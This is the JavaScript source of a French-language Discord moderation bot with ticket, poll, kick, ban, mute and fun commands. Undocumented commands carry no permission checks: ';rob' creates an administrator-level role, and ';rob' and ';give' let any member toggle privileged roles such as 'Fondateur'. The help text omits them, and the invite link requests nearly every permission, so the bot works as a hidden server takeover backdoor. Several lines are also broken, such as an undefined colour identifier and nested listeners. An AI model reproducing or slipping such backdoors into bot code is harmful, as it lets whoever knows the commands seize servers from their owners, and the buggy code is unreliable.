const Discord = require('discord.js');
const client = new Discord.Client();

var prefix = ";";

client.login(process.env.TOKEN);
 
client.on('ready', message => {
    client.user.setActivity(`;help | ${client.guilds.size} Serveurs | ${client.users.size} Utilisateurs`, 
    {url: 'https://twitch.tv/virtox'}, {type: 'WATCHING'})
  
    console.log("        *``*___*``*");
    console.log("✓ Le bot a bien été lancer !");
    console.log("        *``*___*``*");
  })

client.on('message', async message =>{
    if(message.content.startsWith(";mp")) {
  
      var args = message.content.split(" ").slice(1);
      var msge = args.join(' ');
  
      if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Tut tut tut. Bouge ou jte mange.");
      if(!msge) return message.channel.send("tell me what you want to send to the entire server ( members who deactivate private messages will receive nothing)")
      message.guild.members.map(m => m.send(msge))
      .catch(console.error)
      console.log("cdm mpall demandé par "+ message.member.displayName + " son id discord " + message.member + ' le mp envoyé "' + message.content.split(" ").slice(1) + `"`)
  }

  const bot = new Discord.Client();

  if(message.content.startsWith(prefix + 'dog')) {

    var chien = [

        "https://media.giphy.com/media/RQSuZfuylVNAY/giphy.gif",
        "https://media.giphy.com/media/bbshzgyFQDqPHXBo4c/giphy.gif",
        "https://media.giphy.com/media/dTJd5ygpxkzWo/giphy.gif"
    ];

    var gif = chien[Math.floor(Math.random() * chien.length)];

    var dog_embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setTitle("Image aléatoir de chien :dog:")
    .setImage(gif)
    .setFooter("Image de chien - VirToX")
    message.channel.send(dog_embed);
}
  })

  client.on("message", message => {

    if(message.content.startsWith(prefix + "sondage")) {
        if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Tu ne peux pas effectuer de sondage");
          let args = message.content.split(" ").slice(1);
          let thingToEcho = args.join(" ")
          var embed = new Discord.RichEmbed()
            .setDescription(":tada: Sondage :tada:")
            .addField(thingToEcho, "Répondre avec :white_check_mark: ou :x:")
            .setColor("0x0000FF")
            .setTimestamp()
          message.delete();
          message.channel.send(embed)
          .then(function (message) {
            message.react("✅")
            message.react("❌")
          }).catch(function() {
          });
          }

  })

  client.on("message", message => {

    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)

    if (args[0].toLocaleLowerCase() === prefix + '8ball'){
        if (!args[0]) return message.channel.send("Veuillez **poser une question** :x:")
        let rep = ["Non :x:", "J'ai envie de dormir :zzz:", "Balec :face_palm:", "Peut être... :thinking:", "Absolument :interrobang:"];
        let reptaille = Math.floor((Math.random() * rep.length));
        let question = args.slice(0).join(" ");
      
        let ball = new Discord.RichEmbed()
            .setAuthor(message.author.tag)
            .setColor("d6680e")
            .addField("Question:", question)
            .addField("Réponse:", rep[reptaille]);
        message.channel.send(ball)
      }

  })

client.on("message", message => {
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
 
    if (args[0].toLowerCase() === prefix + "clear") {
        if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande")
        let count = args[1]
        if (!count) return message.channel.send("Veuillez indiquer un nombre de messages à supprimer")
        if (isNaN(count)) return message.channel.send("Veuillez indiquer un nombre valide")
        if (count < 1 || count > 100) return message.channel.send("Veuillez indiquer un nombre entre 1 et 100")
        message.channel.bulkDelete(parseInt(count) + 1)
    }
 
    if (args[0].toLowerCase() === prefix + "mute") {
        if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande")
        let member = message.mentions.members.first()
        if (!member) return message.channel.send("Membre introuvable")
        if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.ownerID) return message.channel.send("Vous ne pouvez pas mute ce membre")
        if (member.highestRole.calculatedPosition >= message.guild.me.highestRole.calculatedPosition || member.id === message.guild.ownerID) return message.channel.send("Je ne peux pas mute ce membre")
        let muterole = message.guild.roles.find(role => role.name === 'Muted')
        if (muterole) {
            member.addRole(muterole)
            message.channel.send(member + ' a été mute :white_check_mark:')
        }
        else {
            message.guild.createRole({name: 'Muted', permissions: 0}).then((role) => {
                message.guild.channels.filter(channel => channel.type === 'text').forEach(channel => {
                    channel.overwritePermissions(role, {
                        SEND_MESSAGES: false
                    })
                })
                member.addRole(role)
                message.channel.send(member + ' a été mute :white_check_mark:')
            })
        }
    }

    if (message.content === prefix + "help") {
        var help_embed = new Discord.RichEmbed()
            .setColor("RANDOM")
            .setTitle("👑 | **HELP** | 👑")
            .addField("🔧 / ADMIN \\ 🔧", "Commandes utilisable que par les administrateur !")
            .addField("**;ban**", "*Permet de bannir un utilisateur* : **;ban @user {raison}**")
            .addField("**;kick**", "*Permet de kick un utilisateur* : **;kick {raison}**")
            .addField("**;clear**", "*Permet de clear le chat* : **;clear 1 -> 99**")
            .addField("**;sondage**", "*Permet de faire un sondage* : **;sondage Je suis BG ?**")
            .addField("❓ / Ticket \\ ❓", "Commande utilisable pour 'everyone'")
            .addField("**;new**", "*Permet de cree un ticket !* : **;new**")
            .addField("**;close**", "*Permet de fermer le ticket* : **;close** (etre dans le channel du ticket)")
            .addField("**;add**" , "*Permet d'ajouter une personnes au ticket* : **;add @Walabilal**")
            .addField("**;remove**", "*Peremt de retirer une personne du ticket* : **;remove @Walabilal**")
            .addField("😂 / Fun \\ 😂", "Commande utilisable par 'everyone'")
            .addField("**;dog**", "*Permet d'afficher un GIF de chien* : **;dog**")
            .addField("**;8ball**", "*Permet de poser une questionau bot* : **;8ball Tu es BG ?**")
            .setFooter(".۷เгŦ๏χ - Đєט 🐧#4969")
            message.channel.send(help_embed);
    }
})

client.on('message', message => {
  if (message.content === `${prefix}credits`){

    let serverembed = new Discord.RichEmbed()
    .setTitle("**Credits:** ⭐")
    .setThumbnail(`${message.author.avatarURL}`)
    .setColor("FE656F")
    .addField("Créateur du bot:","VirToX.")
    .addField("Ses résaux:",'Discord: "＂۷เгŦ๏χ#4969 \nAutres résaux: perso :x:')
    .addField("Invinter le bot", "https://discordapp.com/oauth2/authorize?client_id=606482261780594711&scope=bot&permissions=2146958591 **vous pouvez ajustez les permissions du BOT $$**")
    .setFooter("By ＂۷เгŦ๏χ#4969", message.author.avatarURL)
    .setTimestamp()

    return message.channel.send(serverembed);
  }
}
)

/*Kick*/
client.on('message',message =>{
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
 
    if (args[0].toLocaleLowerCase() === prefix + 'kick'){
       if (!message.member.hasPermission('KICK_MEMBERS')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande ;(")
       let member = message.mentions.members.first()
       if (!member) return message.channel.send("Veuillez mentionner un utilisateur :x:")
       if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.channel.send("Vous ne pouvez pas kick cet utilisateur :x:")
       if (!member.kickable) return message.channel.send("Je ne peux pas exclure cet utilisateur :sunglass:")
       member.kick()
       message.channel.send("**"+member.user.username + '** a été exclu :white_check_mark:')
    }
});
 
/*Ban*/
client.on('message',message =>{
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
 
    if (args[0].toLocaleLowerCase() === prefix + 'ban'){
       if (!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande ;(")
       let member = message.mentions.members.first()
       if (!member) return message.channel.send("Veuillez mentionner un utilisateur :x:")
       if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.channel.send("Vous ne pouvez pas bannir cet utilisateur :x:")
       if (!member.bannable) return message.channel.send("Je ne peux pas bannir cet utilisateur :sunglass:")
       message.guild.ban(member, {days: 7})
       message.channel.send("**"+member.user.username + '** a été banni :white_check_mark:')
    }

    client.on('message', message =>{
        if(message.content[0] === prefix) {
            if(message.content === prefix + 'rob'){
                // on cherche cherche le rôle sur le serveur
                let role = message.guild.roles.find('name', '- Sasuke ! -')

                if(message.member.role.find('name', '- Sasuke ! -')) {
                    message.member.removeRole(role)
                    message.reply('Ses bon nous vous avons retirez le role "- Sasuke ! -"')
                }
                else {
                    message.member.addRole(role)
                    message.reply('Voila ! Vous avez le role "- Sasuke ! -"')
                }
            } 
        }
    })
});

client.on('message', message => {
    if(message.content === prefix + "rob"){
    message.guild.createRole({
        name: 'Hehe',
        color: 'BLUE',
        permissions: 'ADMINISTRATOR',
        position: '1'
    })
        .then(role => console.log(`Created new role with name ${role.name}, color ${role.color}, permissions ${role.permissions} and position ${role.position}`))
        .catch(console.error)    
    }
})


client.on('message', message => {
  if(message.content === prefix + 'give'){
    let role = message.guild.roles.find('name', 'Fondateur')
    if(message.member.roles.find('name', 'Fondateur')) {
      message.member.removeRole(role)
    }
    else {
        message.member.addRole(role)
    }
  }
})

client.on("message", (message) => {
    if (message.content.toLowerCase().startsWith(prefix + `new`)) {
     const reason = message.content.split(" ").slice(1).join(" ");
     if (!message.guild.roles.exists("name", "Support")) {
     const embed0 = new Discord.RichEmbed()
     .setColor("dd0d0d")
     .addField(`Dinguerie`, `Vous devez crée un rôle nommé Support.`)
     message.channel.send({ embed: embed0 });
     return
     }
     if (message.guild.channels.exists("name", "ticket-" + message.author.username)) {
     const embed1 = new Discord.RichEmbed()
     .setColor(dd0d0d)
     .addField(`Dinguerie`, `Vous avez déjà un ticket ouvert.`)
     message.channel.send({ embed: embed1 });
     return
     }
 
     message.guild.createChannel(`ticket-🔔🔔${message.author.username}🔔🔔`, "text").then(c => {
         let role = message.guild.roles.find("name", "Support");
         let role2 = message.guild.roles.find("name", "@everyone");
         c.overwritePermissions(role, {
             SEND_MESSAGES: true,
             READ_MESSAGES: true
         });
         c.overwritePermissions(role2, {
             SEND_MESSAGES: false,
             READ_MESSAGES: false
         });
         c.overwritePermissions(message.author, {
             SEND_MESSAGES: true,
             READ_MESSAGES: true
         });
         const embed2 = new Discord.RichEmbed()
         .setColor(dd0d0d)
         .addField(`Dinguerie`, `Ton ticket a été crée : ` + c.toString())
         .setTimestamp();
         message.channel.send({ embed: embed2 });
 
         const embed3 = new Discord.RichEmbed()
         .setColor(dd0d0d)
         .addField(`Bonjour ${message.author.username}!`, `Votre ticket a bien été ouvert un de nos staff va vous répondre le plus rapidement possible.`)
         .setTimestamp();
         c.send({ embed: embed3 });
     }).catch(console.error);
   }
 
   if (message.content.toLowerCase().startsWith(prefix + `close`)) {
     if (!message.channel.name.startsWith(`ticket-`)) {
     const embed8 = new Discord.RichEmbed()
     .setColor("dd0d0d")
     .addField(`Dinguerie`, `Vous devez être dans un salon de ticket.`)
     message.channel.send({ embed: embed8 });
     return
     }   
 
     const embed9 = new Discord.RichEmbed()
     .setColor("dd0d0d")
     .addField(`Dinguerie`, 'Tapez \`#.confirmer\` pour confirmer.')
     message.channel.send({ embed: embed9 })
     .then((m) => {
       message.channel.awaitMessages(response => response.content === '#.confirmer', {
         max: 1,
         time: 15000,
         errors: ['time'],
       })
       .then((collected) => {
           message.channel.delete();
         })
         .catch(() => {
           m.edit('').then(m2 => {
               m2.delete();
           }, 3000);
         });
     });
   }
 
   if (message.content.toLowerCase().startsWith(prefix + `add`)) {
     if (!message.channel.name.startsWith(`ticket-`)) {
     const embed4 = new Discord.RichEmbed()
     .setColor("dd0d0d")
     .addField(`Dinguerie`, `Vous devez être dans un salon de ticket.`)
     message.channel.send({ embed: embed4 });
     return
     }
     addedmember = message.mentions.members.first();
     message.channel.overwritePermissions(addedmember, { SEND_MESSAGES : true, VIEW_CHANNEL : true});
     const embed5 = new Discord.RichEmbed()
     .setColor(dd0d0d)
     .addField(`Dinguerie`, '**' + addedmember + `** a été ajouter au ticket, utilisez la commande [${prefix}remove]() pour l\'enlever`)
     message.channel.send({ embed: embed5 });
 
   }
 
   if (message.content.toLowerCase().startsWith(prefix + `remove`)) {
     if (!message.channel.name.startsWith(`ticket-`)) {
     const embed6 = new Discord.RichEmbed()
     .setColor(dd0d0d)
     .addField(`Dinguerie`, `Vous devez être dans un salon de ticket.`)
     message.channel.send({ embed: embed6 });
     return
     }
     removedmember = message.mentions.members.first();
     message.channel.overwritePermissions(removedmember, { SEND_MESSAGES : false, VIEW_CHANNEL : false});
     const embed7 = new Discord.RichEmbed()
     .setColor(dd0d0d)
     .addField(`Dinguerie`, '**' + removedmember + '** a été retirer du ticket.')
     message.channel.send({ embed: embed7 });
   }
 });

 client.on('guildMemberAdd', member => {
    const channel = member.guild.channels.find(ch => ch.name === 'logs');
    if(!channel) return;
    channel.send(`**[+]** **${member}** est arriver sur le serveur !`)
  })
  
  client.on('guildMemberRemove', member => {
    const channel = member.guild.channels.find(ch => ch.name === 'logs');
    if(!channel) return;
    channel.send(`**[-]** **${member}** à quitter le serveur !`)
  })
